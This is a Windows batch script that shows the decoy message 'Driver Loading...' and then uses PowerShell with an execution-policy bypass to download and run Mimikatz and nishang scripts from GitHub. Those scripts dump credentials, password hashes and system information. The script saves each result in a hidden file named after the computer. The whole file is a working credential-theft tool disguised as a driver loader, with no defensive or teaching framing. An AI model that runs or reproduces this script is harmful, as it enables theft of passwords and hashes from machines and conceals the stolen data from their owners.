echo off
cls
echo Driver Loading...
if exist %COMPUTERNAME%.txt attrib -h %COMPUTERNAME%.txt
powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jonbarclay/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" > %COMPUTERNAME%.txt
REM powershell -nop -exec bypass . ".\Invoke-Mimikatz.ps1"; Invoke-Mimikatz -DumpCreds >> %COMPUTERNAME%.txt
attrib +h %COMPUTERNAME%.txt
if exist %COMPUTERNAME%.hash attrib -h %COMPUTERNAME%.hash
powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jonbarclay/nishang/master/Gather/Get-PassHashes.ps1'); Get-PassHashes" > %COMPUTERNAME%.hash
REM powershell -nop -exec bypass . ".\Get-PassHashes.ps1"; Get-PassHashes >> %COMPUTERNAME%.hash
attrib +h %COMPUTERNAME%.hash

if exist %COMPUTERNAME%.info attrib -h %COMPUTERNAME%.info
powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jonbarclay/nishang/master/Gather/Get-Information.ps1'); Get-Information" > %COMPUTERNAME%.info
REM powershell -nop -exec bypass . ".\Get-PassHashes.ps1"; Get-PassHashes >> %COMPUTERNAME%.hash
attrib +h %COMPUTERNAME%.info
exit
